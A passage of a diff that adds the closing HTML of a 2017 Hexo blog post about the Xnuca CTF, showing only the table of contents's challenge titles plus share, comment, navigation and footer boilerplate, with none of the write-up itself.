toc-level-2"><a class="toc-link" href="#Q6-Normal-normal"><span class="toc-number">1.6.</span> <span class="toc-text">Q6 Normal_normal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q7-NDBexplorer"><span class="toc-number">1.7.</span> <span class="toc-text">Q7 NDBexplorer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q8-RotatePicture"><span class="toc-number">1.8.</span> <span class="toc-text">Q8 RotatePicture</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q9-AdminLogin"><span class="toc-number">1.9.</span> <span class="toc-text">Q9 AdminLogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q10-WeirdCamel"><span class="toc-number">1.10.</span> <span class="toc-text">Q10 WeirdCamel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q11-OneWayIn"><span class="toc-number">1.11.</span> <span class="toc-text">Q11 OneWayIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q12-HelloBoss"><span class="toc-number">1.12.</span> <span class="toc-text">Q12 HelloBoss</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反思"><span class="toc-number">2.</span> <span class="toc-text">反思</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#需要学习的地方"><span class="toc-number">3.</span> <span class="toc-text">需要学习的地方</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-5 i,
+        .toc-level-5 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Xnuca　| shin's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2017/01/19/xnuca/" data-title="Xnuca" data-url="http://yoursite.com/2017/01/19/xnuca/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"shinpachi8"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+            // Add comment count
+            $(function(){ 
+                var jsonUrl = "http://api.duoshuo.com/threads/counts.jsonp?short_name=shinpachi8&threads=2017/01/19/xnuca/&callback=?";
+                $.getJSON(jsonUrl, function(result){
+                    $.each(result.response, function(i, field){
+                        var value = field.comments;
+                        if (value > 0) {
+                            $(".count-comment").text(value);
+                            return;
+                        }
+                    })
+                })
+            })
+        
+    </script>
+    
+    <aside class="comment-bar">
+        <a href="javascript:void(0);">
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").hover(function(){
+            load$hide();
+        })
+        if (window.location.hash === "#comments") {
+            load$hide();
+        }
+    </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/01/18/xxe漏洞及xxe练习/" title="下一篇: Xxe漏洞及xxe练习">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/xnuca/">Xnuca</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/18/xxe漏洞及xxe练习/">Xxe漏洞及xxe练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/18/hctf-2016-write-up/">Hctf 2016 Write Up</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/16/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2017 Shinpachi8
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
